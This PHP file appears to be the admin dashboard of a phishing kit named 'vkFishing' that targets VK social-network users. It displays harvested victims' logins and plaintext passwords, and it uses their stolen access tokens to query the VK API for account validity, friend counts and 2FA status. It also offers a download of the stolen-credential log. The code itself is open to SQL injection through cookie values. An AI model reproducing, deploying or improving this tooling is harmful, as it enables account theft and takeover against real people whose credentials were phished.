<?php

	session_start();

	if(isset($_COOKIE['uid']) AND isset($_COOKIE['code']) AND isset($_COOKIE['hash'])) {
		$user = mysql_fetch_assoc(mysql_query("SELECT `id`, `code` FROM `users` WHERE `id` = '".$_COOKIE['uid']."'"));
		$code = md5($user['code']);
		$hash = md5($_SERVER['REMOTE_ADDR'].':'.$user['id']);
		
		if($_COOKIE['uid'] != $user['id'] OR $_COOKIE['code'] != $code OR $_COOKIE['hash'] != $hash) {
			setcookie('uid', NULL, time()-3600*7);
			setcookie('code', NULL, time()-3600*7);
			setcookie('hash', NULL, time()-3600*7);
			header('Location: '.siteURL().'/apanel?act=auth');
		} else {
			$admin = mysql_fetch_assoc(mysql_query("SELECT `login`,`dark_theme`,`preloader` FROM `users` WHERE `id` = '".$_COOKIE['uid']."'"));
		}
	} else {
		setcookie('uid', NULL, time()-3600*7);
		setcookie('code', NULL, time()-3600*7);
		setcookie('hash', NULL, time()-3600*7);
		header('Location: '.siteURL().'/apanel?act=auth');
	}
		
?>

<!DOCTYPE html>
<html lang="en">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
	<title><?php echo $page['title']; ?></title>
	<link href="<?php echo siteURL(); ?>/core/themes/dashboard/css/font-awesome.css" rel="stylesheet">
	<link href="<?php echo siteURL(); ?>/core/themes/dashboard/css/ionicons.css" rel="stylesheet">
	<link href="<?php echo siteURL(); ?>/core/themes/dashboard/css/chartist.css" rel="stylesheet">
	<link href="<?php echo siteURL(); ?>/core/themes/dashboard/css/rickshaw.min.css" rel="stylesheet">
	<link rel="stylesheet" href="<?php echo siteURL(); ?>/core/themes/dashboard/css/dashboard.css">
	<?php if($config['dark_theme'] == True AND $admin['dark_theme'] == True) { echo '<link rel="stylesheet" href="<?php echo siteURL(); ?>/core/themes/dashboard/css/dashboard.css">'; } ?>
</head>
<body>
	<?php if($config['preloader'] == True AND $admin['preloader'] == True) { ?>
	<div id="loading">
		<div id="loading-center">
			<div id="loading-center-absolute">
				<div class="object" id="object_four"></div>
				<div class="object" id="object_three"></div>
				<div class="object" id="object_two"></div>
				<div class="object" id="object_one"></div>
			</div>
		</div>
	</div>
	<?php } ?>
	<div class="slim-header">
		<div class="container">
			<div class="slim-header-left">
				<h2 class="slim-logo"><a href="<?php echo siteURL().'/apanel'; ?>">vkFishing</a></h2>
			</div>
			<div class="slim-header-right">
				<a href="<?php echo siteURL(); ?>/apanel?act=settings" class="header-notification">
					<i class="icon ion-gear-a"></i>
				</a>
				<a href="<?php echo siteURL(); ?>/apanel?act=stats" class="header-notification">
					<i class="icon ion-stats-bars"></i>
				</a>
				<div class="dropdown dropdown-c">
					<a href="#" class="logged-user" data-toggle="dropdown"> <img src="https://vk.com/images/gift/952/512.png" alt=""> <span><?php echo $admin['login']; ?></span> <i class="fa fa-angle-down"></i> </a>
					<div class="dropdown-menu dropdown-menu-right">
						<nav class="nav"><a href="<?php echo siteURL(); ?>/apanel?act=edit" class="nav-link"><i class="icon ion-ios-gear"></i> Настройки</a> <a href="<?php echo siteURL().'/apanel?act=logout&hash='.$_COOKIE['hash']; ?>" class="nav-link"><i class="icon ion-forward"></i> Выход</a> </nav>
					</div>
				</div>
			</div>
		</div>
	</div>
	<div class="slim-mainpanel" style="position: relative;">
		<div class="container">
			<div class="card card-dash-one mg-t-20">
				<div class="row no-gutters">
					<div class="col-lg-4"> <i class="icon ion-ios-pie-outline"></i>
						<div class="dash-content">
							<label class="tx-success">Авторизаций сегодня</label>
							<h2><?php $aTotal = mysql_fetch_row(mysql_query("SELECT COUNT(*) FROM `catch` WHERE `date` >= CURDATE()")); echo number_format($aTotal['0'], 0, '', ' '); ?></h2> </div>
					</div>
					<div class="col-lg-4"> <i class="icon ion-person-stalker"></i>
						<div class="dash-content">
							<label class="tx-primary">Посещений сегодня</label>
							<h2><?php $vTotal = mysql_fetch_row(mysql_query("SELECT COUNT(*) FROM `visitors` WHERE `date` >= CURDATE()")); echo number_format($vTotal['0'], 0, '', ' '); ?></h2> </div>
					</div>
					<div class="col-lg-4"> <i class="icon ion-person-stalker"></i>
						<div class="dash-content">
							<label class="tx-purple">Посетителей сегодня</label>
							<h2><?php $uTotal = mysql_fetch_row(mysql_query("SELECT COUNT(distinct `ip`) FROM `visitors` WHERE `date` >= CURDATE()")); echo number_format($uTotal['0'], 0, '', ' '); ?></h2> </div>
					</div>
				</div>
			</div>
			<div class="row row-sm mg-t-20">
				<div class="col-lg-12 mg-t-20 mg-lg-t-0">
					<div class="card card-table card-customer-overview">
						<div class="card-header">
							<h6 class="slim-card-title">Лог авторизаций</h6>
							<nav class="nav">
								<a href="<?php echo siteURL(); ?>/apanel?act=download" class="nav-link">Скачать</a>
							</nav>
						</div>
						<div class="table-responsive">
							<table class="table mg-b-0 tx-13">
								<thead>
									<tr class="tx-10">
										<th class="pd-y-5">&nbsp;</th>
										<th class="pd-y-5">Пользователь</th>
										<th class="pd-y-5">Данные</th>
										<th class="pd-y-5">Счётчики</th>
										<th class="pd-y-5">Состояние</th>
										<th class="pd-y-5">Голосов</th>
										<th class="wd-15p pd-y-5">Дата</th>
										<th class="pd-y-5">Действия</th>
									</tr>
								</thead>
								<tbody>
									<?php
									
										$GET = mysql_query("SELECT * FROM `catch` WHERE `hide` = '0' ORDER BY `id` DESC");
										if(mysql_num_rows($GET) > 0) {
											while($row = mysql_fetch_assoc($GET)) {

												$execute = urlencode('return API.users.get({"user_ids":"'.$row['uid'].'", "fields":"photo_50,counters,last_seen"});');
												$vkapi = json_decode(curl_get_contents(apiMethod('execute', 'code='.$execute.'&v='.$config['vkapiVersion'].'&access_token='.$row['access_token'].'')));

												if(isset($vkapi->error)) {
													$invalid = True;
													
													$execute = urlencode('return API.users.get({"user_ids":"'.$row['uid'].'", "fields":"photo_50,counters,last_seen"});');
													$vkapi = json_decode(curl_get_contents(apiMethod('execute', 'code='.$execute.'&v='.$config['vkapiVersion'].'&access_token='.$config['access_token'].'')));
												}
															
												$row['firstname'] = $vkapi->response[0]->first_name;
												$row['lastname'] = $vkapi->response[0]->last_name;
												$row['avatar'] = $vkapi->response[0]->photo_50;
												$row['friends'] = number_format($vkapi->response[0]->counters->friends, 0, '', ' ');
												$row['followers'] = number_format($vkapi->response[0]->counters->followers, 0, '', ' ');
												$row['online'] = $vkapi->response[0]->last_seen->time;
												
												if($row['2fa'] == '0') {
													$status2fa = '<span class="square-8 bg-success mg-r-5 rounded-circle"></span> 2FA: Нет</span>';
												} elseif($row['2fa'] == '1') {
													$status2fa = '<span class="square-8 bg-danger mg-r-5 rounded-circle"></span> 2FA: Есть</span>';
												} else {
													$status2fa = '<span class="square-8 bg-warning mg-r-5 rounded-circle"></span> 2FA: Неизвестно</span>';
												}
												
												echo '<tr>';
													echo '<td class="pd-l-20"> <img src="'.$row['avatar'].'" class="wd-36 rounded-circle" alt="Image"> </td>';
													echo '<td> <a href="https://vk.com/id'.$row['uid'].'" class="tx-inverse tx-14 tx-medium d-block">'.$row['firstname'].' '.$row['lastname'].'</a> <span class="tx-11 d-block">ID: '.$row['uid'].'</span> </td>';
													echo '<td><span class="tx-11 d-block">Login: '.$row['login'].'</span><span class="tx-11 d-block">Pass: '.$row['password'].'</span></td>';
													echo '<td><span class="tx-11 d-block">Друзей: '.$row['friends'].'</span><span class="tx-11 d-block">Подписчик: '.$row['followers'].'</span></td>';
													if($invalid == True) { echo '<td><span class="tx-11 d-block"><span class="square-8 bg-danger mg-r-5 rounded-circle"></span> Не валидный</span><span class="tx-11 d-block"><span class="square-8 bg-warning mg-r-5 rounded-circle"></span> 2FA: Неизвестно</span></td>'; } else {
														echo '<td><span class="tx-11 d-block"><span class="square-8 bg-success mg-r-5 rounded-circle"></span> Ввалидный</span><span class="tx-11 d-block">'.$status2fa.'</td>';
													}
													echo '<td>'.$row['votes'].' голосов</td>';
													echo '<td><span class="tx-11 d-block">Онлайн: '.new_time(date("d-m-Y H:i:s", $row['online'])).'</span><span class="tx-11 d-block">Добавлен: '.new_time($row['date']).'</span></td>';
													echo '<td class="valign-middle tx-center">';
														echo '<div class="dropdown dropdown-c">';
															echo '<a href="#" class="tx-gray-600 tx-24" data-toggle="dropdown"><i class="icon ion-android-more-horizontal"></i></a>';
															echo '<div class="dropdown-menu dropdown-menu-center">';
																echo '<nav class="nav"><a href="'.siteURL().'/apanel?act=info&id='.$row['id'].'" class="nav-link"><i class="fa fa-address-book-o"></i> Подробности</a> <a href="'.siteURL().'/apanel?act=hide&id='.$row['id'].'" class="nav-link"><i class="fa fa-eye-slash"></i> Скрыть</a> </nav>';
															echo '</div>';
														echo '</div>';
													echo '</td>';
												echo '</tr>';
											}
										} else {
											echo '<tr>
													<td colspan="8"><center>Здесь пока ничего нет...</center></td>
												  </tr>';
										}
										?>
								</tbody>
							</table>
						</div>
					</div>
				</div>
			</div>
		</div>
	</div>
	<div class="slim-footer">
		<div class="container">
			<p>Copyright 2019 © All Rights Reserved.</p>
			<p>Created with <font color="red">❤</font> by <a href="https://lolzteam.net/aptyp4uk1337" target="_blank">ApTyp4uK1337</a></p>
		</div>
	</div>
	<script src="<?php echo siteURL(); ?>/core/themes/dashboard/js/jquery.js"></script>
	<script src="<?php echo siteURL(); ?>/core/themes/dashboard/js/popper.js"></script>
	<script src="<?php echo siteURL(); ?>/core/themes/dashboard/js/bootstrap.js"></script>
	<script src="<?php echo siteURL(); ?>/core/themes/dashboard/js/jquery.cookie.js"></script>
	<script src="<?php echo siteURL(); ?>/core/themes/dashboard/js/chartist.js"></script>
	<script src="<?php echo siteURL(); ?>/core/themes/dashboard/js/d3.js"></script>
	<script src="<?php echo siteURL(); ?>/core/themes/dashboard/js/rickshaw.min.js"></script>
	<script src="<?php echo siteURL(); ?>/core/themes/dashboard/js/jquery.sparkline.min.js"></script>
	<script src="<?php echo siteURL(); ?>/core/themes/dashboard/js/ResizeSensor.js"></script>
	<script src="<?php echo siteURL(); ?>/core/themes/dashboard/js/dashboard.js"></script>
	<script src="<?php echo siteURL(); ?>/core/themes/dashboard/js/slim.js"></script>
	<?php if($config['preloader'] == True AND $admin['preloader'] == True) { ?>
	<script type="text/javascript">
		$(window).load(function() {
			$("#loading").fadeOut(500);
			$("#loading-center").click(function() {
				$("#loading").fadeOut(500);
			})
		})
	</script>
	<?php } ?>
</body>
</html>